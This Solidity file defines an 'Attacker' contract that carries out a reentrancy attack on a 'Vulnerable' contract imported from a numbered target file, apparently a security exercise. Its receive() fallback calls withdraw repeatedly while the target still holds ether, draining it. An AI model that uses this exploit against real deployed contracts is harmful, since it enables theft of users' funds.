// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./13-target.sol";   // Make sure the name of file and contract matches

contract Attacker {
    Vulnerable public vulnerableContract; // Use correct case spelling here
    constructor(address _vulnerableContract) { 
        vulnerableContract = Vulnerable(_vulnerableContract); 
    }
    
    function attack() external payable {
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(msg.value);
    }
    
    receive() external payable {
        if (address(vulnerableContract).balance > 0) {
            vulnerableContract.withdraw(msg.value); 
        }
    }
}